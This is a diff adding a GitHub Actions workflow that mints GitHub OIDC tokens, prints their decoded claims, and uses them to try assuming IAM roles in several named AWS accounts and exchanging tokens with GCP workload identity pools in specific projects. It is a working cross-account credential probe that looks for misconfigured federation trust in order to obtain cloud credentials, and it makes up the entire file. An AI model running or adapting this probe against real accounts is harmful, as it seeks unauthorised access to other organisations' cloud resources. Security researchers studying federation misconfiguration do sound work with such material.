@@ -1,0 +1,55 @@
+name: wif-aws2
+on: [push, workflow_dispatch]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: mint-and-test
+        run: |
+          set -u
+          mint() {
+            curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" | jq -r .value
+          }
+          A=$(mint sts.amazonaws.com)
+          echo "===== AWS ID TOKEN CLAIMS ====="
+          echo "$A" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
+          echo "token_len=${#A}"
+          echo "===== AWS AssumeRoleWithWebIdentity (real signed token) ====="
+          for R in \
+            arn:aws:iam::890664054962:role/upload-playground-artifacts \
+            arn:aws:iam::890664054962:role/definitely-not-a-role \
+            arn:aws:iam::969676484546:role/probe-role \
+            arn:aws:iam::892124123196:role/probe-role \
+            arn:aws:iam::350330337821:role/probe-role \
+            arn:aws:iam::111111111111:role/probe-role ; do
+            out=$(curl -sS -X POST https://sts.amazonaws.com/ \
+              --data-urlencode Action=AssumeRoleWithWebIdentity \
+              --data-urlencode Version=2011-06-15 \
+              --data-urlencode "RoleArn=$R" \
+              --data-urlencode RoleSessionName=probe \
+              --data-urlencode "WebIdentityToken=$A")
+            code=$(echo "$out" | grep -o '<Code>[^<]*' | head -1 | sed 's/<Code>//')
+            msg=$(echo "$out" | grep -o '<Message>[^<]*' | head -1 | sed 's/<Message>//')
+            echo "AWS $R => ${code:-200OK} :: ${msg}"
+          done
+          echo "===== GCP WIF token exchange (real signed token) ====="
+          for AUD in \
+            'https://iam.googleapis.com/projects/892124123196/locations/global/workloadIdentityPools/github/providers/github' \
+            'https://iam.googleapis.com/projects/892124123196/locations/global/workloadIdentityPools/github-actions/providers/github-actions' \
+            'https://iam.googleapis.com/projects/969676484546/locations/global/workloadIdentityPools/github/providers/github' ; do
+            T=$(mint "$AUD")
+            aud2="//${AUD#https://}"
+            out=$(curl -sS -X POST https://sts.googleapis.com/v1/token \
+              -H 'Content-Type: application/x-www-form-urlencoded' \
+              --data-urlencode 'grant_type=urn:ietf:params:oauth:grant-type:token-exchange' \
+              --data-urlencode 'requested_token_type=urn:ietf:params:oauth:token-type:access_token' \
+              --data-urlencode 'subject_token_type=urn:ietf:params:oauth:token-type:jwt' \
+              --data-urlencode 'scope=https://www.googleapis.com/auth/cloud-platform' \
+              --data-urlencode "audience=$aud2" \
+              --data-urlencode "subject_token=$T")
+            echo "GCP $AUD => $(echo "$out" | head -c 240)"
+          done
